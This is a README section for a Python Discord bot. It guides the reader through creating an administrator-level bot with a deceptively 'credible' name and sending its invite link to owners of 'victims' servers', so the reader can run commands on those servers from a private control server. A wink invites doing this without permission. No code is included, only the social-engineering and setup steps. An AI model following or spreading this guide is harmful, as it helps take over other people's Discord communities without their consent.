## More advanced explanation

This bot and python works using discord's api to run on python. To make this work you will need to create a server with you and your bot, then make owner of other server add the bot with the necesary permision(Admin). Then from your very own server you can simply excute commands on others server ! (With their permision.)
(You can still try it tho without their permisionüòâ)

## Create a server

Create a server were there's no one. It will be our control center.

## Create the bot

1. In order to create the bot and get his token, go to [Discord Developer Portal](https://discord.com/developers/applications).
2. Create a new application, then name it to be credible for others to add it more easily and finally accepts Discord Developer terms.
3. You can personalise the bot (Add a pfp or a description)
4. Go into bot section, click Reset token then it will display the bot token. Note it somewere we will need it after.
5. Still in bot section scroll down a little bit then in Privileged Gateway Intents activate all of 3 (PRESENCE INTENT, SERVER MEMBERS INTENT, MESSAGE CONTENT INTENT).
6. Finally go into 0Auth2 tab, scroll at the bottom the you will see OAuth2 URL Generator, Select bot then select the permision the bot will have, I will choose admin for simplicity.
7. Copy the GENERATED URL, add it to your server and send the url to the owner of the victims server.

And there you go ! You've created your bot and add it to your server and the victims server.
